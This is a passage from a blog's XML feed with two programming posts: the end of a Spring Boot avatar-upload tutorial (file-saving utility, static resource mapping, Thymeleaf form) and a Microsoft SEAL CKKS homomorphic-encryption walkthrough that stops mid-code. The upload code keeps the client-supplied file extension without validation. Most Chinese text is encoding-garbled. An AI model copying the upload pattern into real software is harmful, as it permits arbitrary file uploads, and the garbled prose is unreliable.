id<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre>              </div>            </details></div><h2 id="FileUtilsä»£ç ">FileUtilsä»£ç </h2><div class="story post-story"><details green><summary> code </summary>              <div class='content'>              <pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>sizaif<span class="token punctuation">.</span>emsdemo<span class="token punctuation">.</span>utils</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>multipart<span class="token punctuation">.</span></span><span class="token class-name">MultipartFile</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">File</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span>UUID<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">FileUtils</span> <span class="token punctuation">&#123;</span>    <span class="token comment">/**     * å”¯ä¸€è¯†åˆ«çš„UUID     * @return     */</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">getUUID</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> UUID<span class="token punctuation">.</span><span class="token function">randomUUID</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">"-"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * è·å–æ–‡ä»¶åç¼€     * @param fileName     * @return     */</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">getSuffix</span><span class="token punctuation">(</span><span class="token class-name">String</span> fileName<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> fileName<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>fileName<span class="token punctuation">.</span><span class="token function">lastIndexOf</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * å’Œéšæœºçš„UUIDç”Ÿæˆæ–°çš„æ–‡ä»¶å     * @param fileOriginName     * @return     */</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">getFileName</span><span class="token punctuation">(</span><span class="token class-name">String</span> fileOriginName<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">getUUID</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">getSuffix</span><span class="token punctuation">(</span>fileOriginName<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * ä¿å­˜æ–‡ä»¶åˆ°æœ¬åœ°,å¹¶è¿”å›æ–°çš„å”¯ä¸€æ–‡ä»¶å     * @param file æ–‡ä»¶     * @param path æ–‡ä»¶å­˜æ”¾è·¯å¾„     * @param fileName æ–‡ä»¶åå­—     * @return     */</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">upload</span><span class="token punctuation">(</span><span class="token class-name">MultipartFile</span> file<span class="token punctuation">,</span> <span class="token class-name">String</span> path<span class="token punctuation">,</span> <span class="token class-name">String</span> fileName<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">String</span> newFileName <span class="token operator">=</span> <span class="token function">getFileName</span><span class="token punctuation">(</span>fileName<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// ç”Ÿæˆæ–°çš„æ–‡ä»¶å</span>        <span class="token class-name">String</span> realPath <span class="token operator">=</span> path <span class="token operator">+</span> <span class="token string">"/"</span> <span class="token operator">+</span> newFileName<span class="token punctuation">;</span>        <span class="token class-name">File</span> dest <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span>realPath<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//åˆ¤æ–­æ–‡ä»¶çˆ¶ç›®å½•æ˜¯å¦å­˜åœ¨</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>dest<span class="token punctuation">.</span><span class="token function">getParentFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            dest<span class="token punctuation">.</span><span class="token function">getParentFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token comment">//ä¿å­˜æ–‡ä»¶</span>            file<span class="token punctuation">.</span><span class="token function">transferTo</span><span class="token punctuation">(</span>dest<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> newFileName<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre>              </div>            </details></div><h2 id="MVCConfigè®¾ç½®">MVCConfigè®¾ç½®</h2><div class="story post-story"><details green><summary> code </summary>              <div class='content'>              <pre class="language-java" data-language="java"><code class="language-java">æ–°å»º<span class="token class-name">MyMvcConfig</span><span class="token punctuation">.</span>java <span class="token annotation punctuation">@Configuration</span><span class="token annotation punctuation">@Component</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MyMvcConfig</span> <span class="token keyword">implements</span> <span class="token class-name">WebMvcConfigurer</span> <span class="token punctuation">&#123;</span>        <span class="token comment">//    æ¥å…¥è™šæ‹Ÿè·¯å¾„ï¼ˆè§£å†³é‡å¯æœåŠ¡å™¨æ‰æ˜¾ç¤ºå›¾ç‰‡çš„é—®é¢˜ï¼‰</span>    <span class="token comment">// æ‹¦æˆªæœ¬åœ°è·¯å¾„</span>    <span class="token comment">// å‰ç«¯ä»£ç åªéœ€è¦è®¾ç½®æˆåˆ°/images/ç›®å½•ä¸‹æ‹¿å›¾ç‰‡,</span>   <span class="token comment">// ä¾¿å¯ä»¥è‡ªåŠ¨åˆ°è‡ªå·±è®¾ç½®çš„pathç›®å½•ä¸‹æ‹¿å›¾ç‰‡</span>    <span class="token annotation punctuation">@Value</span><span class="token punctuation">(</span><span class="token string">"$&#123;web.upload-path&#125;"</span><span class="token punctuation">)</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> path<span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">addResourceHandlers</span><span class="token punctuation">(</span><span class="token class-name">ResourceHandlerRegistry</span> registry<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token comment">// addResourceHandler: ï¼ˆ å­˜å‚¨å›¾ç‰‡çš„è™šæ‹Ÿè·¯å¾„ï¼Œåœ¨ static ç›®å½•ä¸‹çš„ picture æ–‡ä»¶å¤¹ï¼Œç”¨äºå­˜å‚¨ä¸Šä¼ å›¾ç‰‡ï¼‰</span>        <span class="token comment">// addResourceLocations: ï¼ˆ file: + å­˜å‚¨å›¾ç‰‡çš„è·¯å¾„ï¼‰</span>        registry<span class="token punctuation">.</span><span class="token function">addResourceHandler</span><span class="token punctuation">(</span><span class="token string">"/images/**"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addResourceLocations</span><span class="token punctuation">(</span><span class="token string">"file:"</span> <span class="token operator">+</span>path <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span></code></pre>              </div>            </details><h1>å‰ç«¯ä»£ç </h1></div><h2 id="ä¸Šä¼ ä»£ç ">ä¸Šä¼ ä»£ç </h2><div class="story post-story"><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">th:</span>action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>@&#123;/users/doUpload/&#125; + $&#123;ProfilesInfo.getId()&#125;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>btn btn-success <span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>imgfile<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>i</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>fa  fa-image m-right-xs<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>i</span><span class="token punctuation">></span></span>ä¿®æ”¹ç…§ç‰‡<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>input</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>tn btn-success<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ä¸Šä¼ <span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></code></pre></div><h2 id="æ˜¾ç¤ºä»£ç ">æ˜¾ç¤ºä»£ç </h2><div class="story post-story"><p>${ProfilesInfo.getImage()} æ‹¿åˆ°çš„æ˜¯æ•°æ®åº“ä¸­å›¾ç‰‡çš„åå­—</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>img-responsive avatar-view<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">th:</span>src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>@&#123;/images/&#125;+$&#123;ProfilesInfo.getImage()&#125;<span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Avatar<span class="token punctuation">"</span></span> <span class="token attr-name">title</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Change the avatar<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">F_Open_dialog</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span></code></pre></div>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯å‘ </category>
          
          <category> Java </category>
          
          <category> Springboot </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> Springboot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SEALå­¦ä¹ ç¬¬å››å¤©-Ckks_basics</title>
      <link href="/posts/51f3b771/"/>
      <url>/posts/51f3b771/</url>
      
        <content type="html"><![CDATA[<blockquote><p>@auther by sizaif</p></blockquote><h1>SEAL å­¦ä¹ ç¬¬å››å¤©ï¼š ckks_basics</h1><p>@[toc]</p><h2 id="ç®€ä»‹è¯´æ˜">ç®€ä»‹è¯´æ˜</h2><div class="story post-story"><p>é€šå¸¸ä¸€ä¸ªå¥½çš„ç­–ç•¥æ˜¯ä¸ºCKKSé€‰æ‹©å‚æ•°æ–¹æ¡ˆå¦‚ä¸‹:</p><pre><code>    (1) é€‰æ‹©ä¸€ä¸ª60ä½ç´ æ•°ä½œä¸ºcoeff_modulusä¸­çš„ç¬¬ä¸€ä¸ªç´ æ•°.è¿™å°†è§£å¯†æ—¶ç»™å‡ºæœ€é«˜çš„ç²¾åº¦;     (2) é€‰æ‹©å¦ä¸€ä¸ª60ä½ç´ æ•°ä½œä¸ºcoeff_modulusçš„æœ€åä¸€ä¸ªå…ƒç´ ï¼Œ,åŒæ—¶è¿™å°†è¢«ç”¨ä½œç‰¹æ®Šçš„ç´ æ•°ï¼Œåº”è¯¥ä¸å…¶ä»–è´¨æ•°ä¸­æœ€å¤§çš„ä¸€æ ·æ‰“ï¼›    (3) é€‰æ‹©ä¸­é—´ç´ æ•°å½¼æ­¤æ¥è¿‘</code></pre><p>æˆ‘ä»¬ä½¿ç”¨CoeffModulus::Createæ¥ç”Ÿæˆé€‚å½“å¤§å°çš„ç´ æ•°ã€‚è¯·æ³¨æ„æˆ‘ä»¬çš„coeff_modulusæ˜¯200ä½çš„æ€»å’Œï¼Œè¿™ä½äº</p><p>poly_modulus_degree: CoeffModulus::MaxBitCount(8192)è¿”å›218ã€‚</p><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210812093248.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210812093248.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210812093247166"></p></div><h2 id="scale">scale</h2><div class="story post-story"><p>æ¯”ä¾‹å¢å¤§è¾“å…¥çš„æµ®ç‚¹ç³»æ•°æ•°æ®</p><p>å³ä½¿åœ¨çº¯æ–‡æœ¬å…ƒç´ çš„CKKSæ–¹æ¡ˆåŸºæœ¬ä¸Šæ˜¯å¤šé¡¹å¼çš„æ•´æ•°ç³»æ•°  x^n</p><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210812093239.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210812093239.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210812093238121"></p><p>ç¼–ç çš„ä½ç²¾åº¦;è‡ªç„¶ä¼šå½±å“ç²¾åº¦ç»“æœã€‚</p><p>æ‰€ä»¥è®¾ç½®ä¸€ä¸ªæ”¾å¤§æ¯”ä¾‹ç³»æ•°æ˜¯å¾ˆæœ‰å¿…è¦çš„ã€‚</p><p>æœ‰äº†scale å¿…ç„¶æœ‰rescale</p></div><h2 id="rescale">rescale</h2><div class="story post-story"><p>é€šå¸¸åœ¨ä¹˜æ³•åæ‰§è¡Œ</p><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210812093231.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210812093231.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210812093229431"></p><p>ç›®çš„: ä¹˜æ³•åï¼š scale =  scale + scale = 2*scale å³   $ \Delta^{2}\to \Delta  $</p><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210812093221.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210812093221.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210812093220619"></p><table><thead><tr><th>å‡½æ•°è°ƒç”¨</th><th>å‚æ•°ç±»å‹</th><th>è§£é‡Šè¯´æ˜</th></tr></thead><tbody><tr><td>evaluator.rescale_to_next_inplace(Ciphertext)</td><td>Ciphertext</td><td>é‡æ–°è°ƒæ•´scaleæ¯”ä¾‹ç³»æ•°æ¥è¿‘äºåˆå§‹è®¾ç½®çš„å€¼ï¼Œæ¥è¿‘ä½†ä¸æ˜¯ç­‰äº</td></tr><tr><td>double scale = pow(2.0, 40);</td><td>int</td><td>å®šä¹‰ä¸€ä¸ª2^40 çš„scale æ¯”ä¾‹ç³»æ•°</td></tr><tr><td></td><td></td><td></td></tr></tbody></table></div><h2 id="Encoding-Decoding">Encoding &amp; Decoding</h2><div class="story post-story"><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210812093210.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210812093210.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210812093209543"></p></div><h2 id="è®¡ç®—">è®¡ç®—</h2><div class="story post-story"><p>å¯¹äºå¤šé¡¹å¼ ä¸åŒçš„è®¡ç®—é¡ºåºæ¶ˆè€—çš„å™ªå£°é¢„ç®—ä»¥åŠæ€§èƒ½ä¸åŒ</p><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210812093201.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210812093201.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210812093200182"></p><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210812093151.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210812093151.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210812093149879"></p><p>åœ¨è¿™ä¸ªæ ·ä¾‹ä¸­:</p><p>æ±‚   $F(x) = \pi * x^{3}  + 0.4 * x +1$</p><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210812093137.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210812093137.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210812093136655"></p><pre class="language-c" data-language="c"><code class="language-c">Plaintext plain_coeff3<span class="token punctuation">,</span> plain_coeff1<span class="token punctuation">,</span> plain_coeff0<span class="token punctuation">;</span><span class="token comment">// ç¼–ç </span>encoder<span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span><span class="token number">3.14159265</span><span class="token punctuation">,</span> scale<span class="token punctuation">,</span> plain_coeff3<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// PI</span>encoder<span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span><span class="token number">0.4</span><span class="token punctuation">,</span> scale<span class="token punctuation">,</span> plain_coeff1<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 0.4</span>encoder<span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span><span class="token number">1.0</span><span class="token punctuation">,</span> scale<span class="token punctuation">,</span> plain_coeff0<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 1</span><span class="token comment">// x^2</span>evaluator<span class="token punctuation">.</span><span class="token function">square</span><span class="token punctuation">(</span>x1_encrypted<span class="token punctuation">,</span> x3_encrypted<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// x3_encrypted = x1_encrypted * x1_encrypted</span>evaluator<span class="token punctuation">.</span><span class="token function">relinearize_inplace</span><span class="token punctuation">(</span>x3_encrypted<span class="token punctuation">,</span> relin_keys<span class="token punctuation">)</span><span class="token punctuation">;</span>evaluator<span class="token punctuation">.</span><span class="token function">rescale_to_next_inplace</span><span class="token punctuation">(</span>x3_encrypted<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// é‡æ–°è°ƒæ•´scale è§„æ¨¡</span><span class="token comment">// PI * x</span>evaluator<span class="token punctuation">.</span><span class="token function">multiply_plain</span><span class="token punctuation">(</span>x1_encrypted<span class="token punctuation">,</span> plain_coeff3<span class="token punctuation">,</span> x1_encrypted_coeff3<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// x1_encrypted_coeff3 = x1_encrypted * plain_coeff3</span>evaluator<span class="token punctuation">.</span><span class="token function">rescale_to_next_inplace</span><span class="token punctuation">(</span>x1_encrypted_coeff3<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 0.4*x</span>evaluator<span class="token punctuation">.</span><span class="token function">multiply_plain_inplace</span><span class="token punctuation">(</span>x1_encrypted<span class="token punctuation">,</span> plain_coeff1<span class="token punctuation">)</span><span class="token punctuation">;</span>evaluator<span class="token punctuation">.</span><span class="token function">rescale_to_next_inplace</span><span class="token punctuation">(</span>x1_encrypted<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>ç„¶åå°±å¯ä»¥ä¸‰é¡¹ä¹‹å’Œï¼›ç„¶è€Œ,æœ‰ä¸€ä¸ªä¸¥é‡çš„é—®é¢˜æ˜¯:</p><p>â€‹è¿™ä¸‰ä¸ªæœ¯è¯­ä½¿ç”¨çš„åŠ å¯†å‚æ•°éƒ½æ˜¯ä¸åŒæ˜¯ç”±äºæ¨¡æ•°ä»ç¼©æ”¾è½¬æ¢è€Œæ¥ã€‚</p><p>â€‹è€ŒåŠ å¯†çš„åŠ æ³•å’Œå‡æ³•è¦æ±‚è¾“å…¥çš„levelä¸ºç›¸åŒå¹¶ä¸”åŠ å¯†å‚æ•°(parms_id)åŒ¹é…ã€‚</p><p>â€‹å¦‚æœæœ‰ä¸åŒ¹é…æ—¶ï¼Œæ±‚å€¼å™¨å°†æŠ›å‡ºå¼‚å¸¸ã€‚</p><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210812093126.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210812093126.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210812093125056"></p><p>æˆ‘ä»¬éªŒè¯å¯ä»¥å‘ç°ä¸‰è€…çš„levelæ˜¯ä¸ä¸€æ ·çš„</p><p>åœ¨è¿™ä¸ªæ ·ä¾‹ä¸­ levelçš„å˜åŒ–è¿‡ç¨‹</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token operator">-</span> Product x<span class="token operator">^</span><span class="token number">2</span> has scale <span class="token number">2</span><span class="token operator">^</span><span class="token number">80</span> and is at level <span class="token number">2</span><span class="token punctuation">;</span><span class="token operator">-</span> Product PI<span class="token operator">*</span>x has scale <span class="token number">2</span><span class="token operator">^</span><span class="token number">80</span> and is at level <span class="token number">2</span><span class="token punctuation">;</span><span class="token operator">-</span> We rescaled both down to scale <span class="token number">2</span><span class="token operator">^</span><span class="token number">80</span><span class="token operator">/</span>P_2 and level <span class="token number">1</span><span class="token punctuation">;</span><span class="token operator">-</span> Product PI<span class="token operator">*</span>x<span class="token operator">^</span><span class="token number">3</span> has <span class="token function">scale</span> <span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">^</span><span class="token number">80</span><span class="token operator">/</span>P_2<span class="token punctuation">)</span><span class="token operator">^</span><span class="token number">2</span><span class="token punctuation">;</span><span class="token operator">-</span> We rescaled it down to <span class="token function">scale</span> <span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">^</span><span class="token number">80</span><span class="token operator">/</span>P_2<span class="token punctuation">)</span><span class="token operator">^</span><span class="token number">2</span><span class="token operator">/</span>P_1 and level <span class="token number">0</span><span class="token punctuation">;</span><span class="token operator">-</span> Product <span class="token number">0.4</span><span class="token operator">*</span>x has scale <span class="token number">2</span><span class="token operator">^</span><span class="token number">80</span><span class="token punctuation">;</span><span class="token operator">-</span> We rescaled it down to scale <span class="token number">2</span><span class="token operator">^</span><span class="token number">80</span><span class="token operator">/</span>P_2 and level <span class="token number">1</span><span class="token punctuation">;</span><span class="token operator">-</span> The contant term <span class="token number">1</span> has scale <span class="token number">2</span><span class="token operator">^</span><span class="token number">40</span> and is at level <span class="token number">2.</span></code></pre><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210812093117.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210812093117.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210812093116370"></p><p>ä¸‰è€…çš„scale è™½ç„¶æ¥è¿‘ï¼Œä½†ä¹Ÿæ˜¯ä¸ä¸€æ ·çš„</p><p>è¿™é‡Œæœ‰å‡ ç§æ–¹æ³•æ¥è§£å†³è¿™ä¸ªscaleé—®é¢˜</p><ol><li><p>æ—¢ç„¶P_2å’ŒP_1éå¸¸æ¥è¿‘2 ^ 40,æˆ‘ä»¬å¯ä»¥ç®€å•æ¬ºéª— Microsoft SEALï¼ŒæŠŠscale è®¾ç½®æˆä¸€æ ·çš„ï¼Œå› ä¸ºä»¥åŠéå¸¸æ¥è¿‘2^40</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token comment">// é‡æ–°è®¾ç½®ä¸¤è€…çš„scale</span>x3_encrypted<span class="token punctuation">.</span><span class="token function">scale</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">pow</span><span class="token punctuation">(</span><span class="token number">2.0</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    x1_encrypted<span class="token punctuation">.</span><span class="token function">scale</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">pow</span><span class="token punctuation">(</span><span class="token number">2.0</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></li><li><p>å¦ä¸€ç§æ–¹æ³•å°±æ˜¯å°†1 ç¼–ç æˆ 2^80/P_2 åœ¨åšä¸€ä¸ª multiply_plain å°†levelé™åˆ°ä¸0.4*x ä¿æŒä¸€è‡´</p></li></ol><p>è§£å†³æ‰ä¸Šé¢çš„é—®é¢˜åæˆ‘ä»¬è¿˜æœ‰åŠ å¯†å‚æ•°ä¸åŒ¹é…çš„é—®é¢˜ã€‚è¿™æ˜¯å¾ˆå®¹æ˜“çš„é€šè¿‡ä½¿ç”¨modulus switching (no rescaling) æ¥è§£å†³</p><p>CKKSæ”¯æŒmodulus switchingå°±åƒBFVæ ¼å¼ä¸€æ ·ã€</p><pre class="language-c" data-language="c"><code class="language-c">cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Normalize encryption parameters to the lowest level."</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>parms_id_type last_parms_id <span class="token operator">=</span> x3_encrypted<span class="token punctuation">.</span><span class="token function">parms_id</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>evaluator<span class="token punctuation">.</span><span class="token function">mod_switch_to_inplace</span><span class="token punctuation">(</span>x1_encrypted<span class="token punctuation">,</span> last_parms_id<span class="token punctuation">)</span><span class="token punctuation">;</span>evaluator<span class="token punctuation">.</span><span class="token function">mod_switch_to_inplace</span><span class="token punctuation">(</span>plain_coeff0<span class="token punctuation">,</span> last_parms_id<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>åˆ°ç°åœ¨è¿™ä¸‰ç§å¯†æ–‡ç°åœ¨éƒ½æ˜¯å…¼å®¹çš„ï¼Œå¯ä»¥è¿›è¡Œaddè¿ç®—äº†</p><pre class="language-c" data-language="c"><code class="language-c">cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Compute PI*x^3 + 0.4*x + 1."</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>Ciphertext encrypted_result<span class="token punctuation">;</span>evaluator<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>x3_encrypted<span class="token punctuation">,</span> x1_encrypted<span class="token punctuation">,</span> encrypted_result<span class="token punctuation">)</span><span class="token punctuation">;</span>evaluator<span class="token punctuation">.</span><span class="token function">add_plain_inplace</span><span class="token punctuation">(</span>encrypted_result<span class="token punctuation">,</span> plain_coeff0<span class="token punctuation">)</span><span class="token 